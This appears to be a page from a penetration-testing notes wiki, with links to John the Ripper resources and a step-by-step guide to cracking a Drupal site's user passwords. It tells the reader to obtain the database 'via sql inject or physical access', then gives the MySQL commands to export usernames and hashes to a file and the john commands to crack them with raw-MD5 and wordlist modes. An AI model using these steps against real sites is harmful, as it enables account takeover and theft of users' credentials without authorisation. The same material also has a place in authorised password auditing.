[Version able to bruteforce GPG pass-phrases](https://github.com/shadown/magnum-jumbo)

Compile with Multi-threaded support and GPU support

[Recompiling with multicore support](http://www.win.tue.nl/~aeb/linux/john/john.html)

[Syntax Help](http://www.openwall.com/john/doc/EXAMPLES.shtml) 

[John the Ripper user community resources](http://openwall.info/wiki/john)


How to use John The Ripper to crack Drupal Database:

1. Get the drupal database via sql inject or physical access and save to data.sql 

2. Run sudo /etc/init.d/mysql restart

3. Login to database with mysql -uroot -ptoor

4. Run CREATE database hack

5. Exit mysql and the run the following command

6. mysql -uroot -p hack < data.sql

7. Now you can export the database in the right format for john, as well as run

queries on the data (time logged in, email, etc) once you crack a password

8. get back into mysql, run the command:
use hack;

9. then copy and paste the following text into the mysql run window:
SELECT name,pass INTO OUTFILE '/tmp/goodies.csv'
FIELDS TERMINATED BY ':' OPTIONALLY ENCLOSED BY ""
LINES TERMINATED BY '\n'
FROM drup_users;

10. Exit mysql again and cd into /tmp or move the file to your home directory
(If you cat the file it would show the following)

[goodies.csv]
username:passwordHash1
username:passwordHash2
etc


11. copy the file to john's folder using the following command:
cp /tmp/goodies.csv /pentest/passwords/jtr/


Now run john cracking on it using the following:

./john --format:raw-MD5 goodies.csv

See output in john.pot or run:

./john --format:raw-MD5 goodies.csv --show

You can also do wordlists like this:

./john --format:raw-MD5 goodies.csv -w:wordlist.txt

[Tools](../tools.md)
